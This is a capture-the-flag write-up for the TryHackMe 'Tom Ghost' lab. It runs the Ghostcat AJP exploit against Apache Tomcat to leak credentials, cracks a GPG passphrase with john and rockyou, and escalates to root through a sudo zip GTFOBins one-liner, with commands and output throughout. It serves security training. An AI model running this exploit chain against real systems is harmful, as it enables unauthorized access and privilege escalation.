# THM - Tom Ghost

## IP Address
10.10.102.57

## Write Up
1. do an Nmap scan.
```bash
#make a directory to store where you are going to store you nmap results
mkdir nmap
#scan for open ports and direct results to nmap/initial
nmap -p- -sV -sC -oN nmap/initial 10.10.102.57
```
- Results:
```
root@kali:~# nmap -p- -sV -sC -oN nmap/initial 10.10.102.57
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 12:11 UTC
Nmap scan report for ip-10-10-102-57.eu-west-1.compute.internal (10.10.102.57)
Host is up (0.00070s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:C4:D3:5A:26:6A (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds
```

2. So the description of the room is very straightforward on the exploit. We will use ```searchsploit``` to find the suitable exploit script to use.
```bash
#update searchsploit as this is quite a recent exploit
searchsploit -u

#run search
searchsploit AJP
```

- Results:
```
root@kali:~# searchsploit AJP
---------------------------------- ----------------------------------------
 Exploit Title                    |  Path
                                  | (/usr/share/exploitdb/)
---------------------------------- ----------------------------------------
AjPortal2Php - 'PagePrefix' Remot | exploits/php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat Fil | exploits/multiple/webapps/48143.py
---------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

3. Lets try running the exploit for Apache Tomcat:
```bash
python /usr/share/exploitdb/exploits/multiple/webapps/48143.py 10.10.102.57
```

- Results:
```
root@kali:~# python /usr/share/exploitdb/exploits/multiple/webapps/48143.py 10.10.102.57
Getting resource at ajp13://10.10.102.57:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```
- Seems like we have the user credentials here ```skyfuck:8730281lkjlkjdqlksalks```.

4. Lets see if we can accesss the system ssh with the credentials given:
```bash
ssh skyfuck@10.10.102.57
```
- Yup, we gained access to the server:
```
skyfuck@ubuntu:~$ 
```

5. By running ```ls```, I noticed that there are 2 files:
```
credential.pgp  tryhackme.asc
```

- Lets see if we can read ```tryhackme.asc``` with the following command:
```bash
gpg --import tryhackme.asc
```
- Seems like its not password protected:
```
gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

- Lets decrypt it now with this:
```bash
gpg --decrypt credential.pgp
```

- Ahhhhh! A passphrase is required:
```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
Enter passphrase: 
```

6. Lets take 1 step back and try to crack the hash with ```john```:

- First, convert tryhackme.asc into a john readable hash.
```bash
gpg2john tryhackme.asc > hash
```
- Next, we will crack the hash with ```john```:
```bash
john hash
```
- Ok, it is taking longer than expected, so lets give it a wordlist to work with. We will use ```rockyou.txt```:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
- Results:
```
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2020-04-25 12:49) 7.692g/s 8246p/s 8246c/s 8246C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash --show
Invalid options combination or duplicate option: "--show"
```

-Lets see the password with ```john --show hash```:
```
root@kali:~# john --show hash
tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

7. Lets do this again:
```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

- Seems like its the credential for user ```merlin```.

8. Before you access ```merlin```, lets first just capture the first flag.
```bash
cat /home/merlin/user.txt
```

## Previlege Escalation

9. So apparently we cant run ```sudo -l``` in ```skyfuck```. So I guess this marks the end of our journey with ```skyfuck```.
```
skyfuck@ubuntu:~$ sudo -l
[sudo] password for skyfuck: 
```

- Lets switch user to ```merlin```:
```bash
skyfuck@ubuntu:~$ su - merlin
Password: 
merlin@ubuntu:~$ 
```

10. Yup, we can see ```sudo -l``` now:
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

11. According to [GTFObin](https://gtfobins.github.io/gtfobins), we can run this to maintain root:
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

12. We can then go to ```cd /root``` and ```cat``` the root flag.

